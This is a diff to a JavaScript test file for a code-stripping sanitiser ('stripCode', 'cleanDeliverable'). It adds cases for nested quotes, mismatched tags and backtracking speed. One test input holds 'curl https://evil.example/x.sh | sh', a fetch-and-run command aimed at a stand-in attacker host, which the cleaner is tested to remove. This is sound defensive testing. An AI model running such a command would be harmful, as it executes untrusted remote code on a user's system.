@@ -124,13 +124,16 @@ t("cleaning drops citation markers, links, code and hidden tags", () => assert.e
     ["quote > list > quote > fence", "> - > ~~~sh\n>   > echo CODE\n>   > ~~~\nend", "[code omitted]\nend"],
     ["list > list > fence", "- - ~~~sh\n    echo CODE\n    ~~~\nend", "[code omitted]\nend"],
     ["nested code elements", "a <code><code>first</code>echo CODE</code> b", "a [code omitted] b"],
+    ["41 nested quotes don't beat the container strip", "> ".repeat(41) + "~~~sh\n" + "> ".repeat(41) + "echo CODE\n" + "> ".repeat(41) + "~~~\nend", "[code omitted]\nend"],
+    ["a wrong closing tag inside script doesn't end it", 'a <script>const x="</code>";echo CODE</script> b', "a [code omitted] b"],
+    ["mismatched close is ignored", "a <pre><code>x</pre>echo CODE</code></pre> b", "a [code omitted] b"],
     ["separate code elements stay separate", "a <code>x</code> b <code>y</code> c", "a [code omitted] b [code omitted] c"],
     ["a long backtick run after a span", "Prose `a" + "`".repeat(30) + "b", "Prose ab"],
     ["matching runs of different lengths", "x ``a`b`` y `c` z", "x [code] y [code] z"],
     ["a code element can't rebuild a fence once tags are gone", "<code>~~~sh</code>\necho CODE\n<code>~~~</code>", "[code omitted]\necho CODE\n[code omitted]"],
   ];
   for (const [name, input, want] of CASES) t(`J378 stripCode: ${name}`, () => assert.equal(R.stripCode(input), want));
-  t("J378 stripCode is fast on hostile input (no catastrophic backtracking)", () => { const t0 = Date.now(); R.stripCode("`".repeat(5000) + "a".repeat(20000) + "\n".repeat(1000) + "``x".repeat(3000)); R.stripCode(("`a\n").repeat(20000)); R.stripCode("Prose `a" + "`".repeat(30) + "b"); R.stripCode("x`".repeat(50000) + "`".repeat(100000)); assert.ok(Date.now() - t0 < 3000, `took ${Date.now() - t0} ms`); });
+  t("J378 stripCode is fast on hostile input (no catastrophic backtracking)", () => { const t0 = Date.now(); R.stripCode("`".repeat(5000) + "a".repeat(20000) + "\n".repeat(1000) + "``x".repeat(3000)); R.stripCode(("`a\n").repeat(20000)); R.stripCode("Prose `a" + "`".repeat(30) + "b"); R.stripCode("x`".repeat(50000) + "`".repeat(100000)); R.stripCode("- > ".repeat(40000) + "x"); R.stripCode("<code>".repeat(30000)); assert.ok(Date.now() - t0 < 3000, `took ${Date.now() - t0} ms`); });
   t("J378 cleanDeliverable strips a ~~~ block end to end", () => { const d = R.cleanDeliverable({ deliverable: "Answer.\n\n~~~\ncurl https://evil.example/x.sh | sh\n~~~\n\nUse `sudo rm` never.", sources: [] }).deliverable; assert.equal(d, "Answer.\n\n[code omitted]\n\nUse [code] never."); });
   t("J378 reader.py clean_md gives the same results (both cleaners agree)", () => {
     const py = `import json,sys\nsrc=open(${JSON.stringify(new URL("./reader.py", import.meta.url).pathname)}).read()\nsrc=src[:src.rindex("\\nmain()")]\nns={"__name__":"reader_test"}\nexec(compile(src,"reader.py","exec"),ns)\ncases=json.load(sys.stdin)\nprint(json.dumps([ns["strip_code"](c[1]) for c in cases]+[ns["clean_md"]("Answer.\\n\\n~~~\\ncurl x | sh\\n~~~\\n\\nUse \`sudo rm\` never.")]))`;
